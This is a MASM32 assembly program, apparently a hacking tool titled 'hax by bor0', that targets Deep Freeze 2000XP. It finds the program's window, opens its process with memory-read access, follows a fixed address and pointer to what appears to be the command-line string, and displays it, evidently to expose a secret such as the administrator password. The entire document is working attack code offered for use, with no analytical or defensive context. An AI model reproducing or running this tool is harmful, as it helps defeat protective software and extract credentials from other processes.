.386
.model flat, stdcall
option casemap :none

include \masm32\include\windows.inc

include \masm32\include\user32.inc
include \masm32\include\kernel32.inc

includelib \masm32\lib\user32.lib
includelib \masm32\lib\kernel32.lib


.data
mystring db "Deep Freeze 2000XP", 0
myfile   db "cmdline.txt", 0
haxby    db "h",0,"a",0,"x",0,32,0,"b",0,"y",0,32,0,"b",0,"o",0,"r",0,"0", 0, 0

.data?
temp_id  dd ?
handle   dd ?
bytwrit  dd ?

mybuffer db 256 dup(?)

.code
start:
invoke CreateFile, ADDR myfile, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0

mov handle, eax
invoke ReadFile, eax, ADDR mybuffer, 256, ADDR bytwrit, 0
invoke CloseHandle, handle

invoke FindWindow, 0, ADDR mybuffer

invoke GetWindowThreadProcessId, eax, ADDR temp_id
invoke OpenProcess, PROCESS_VM_READ, 0, temp_id
mov handle, eax

invoke ReadProcessMemory, eax, 020000h, ADDR mybuffer, 256, ADDR bytwrit
mov eax, dword ptr [mybuffer+68]
invoke ReadProcessMemory, [handle], eax, ADDR mybuffer, 256, ADDR bytwrit

invoke MessageBoxW, 0, ADDR mybuffer, ADDR haxby, 0

invoke CloseHandle, [handle]
invoke ExitProcess, 0

end start
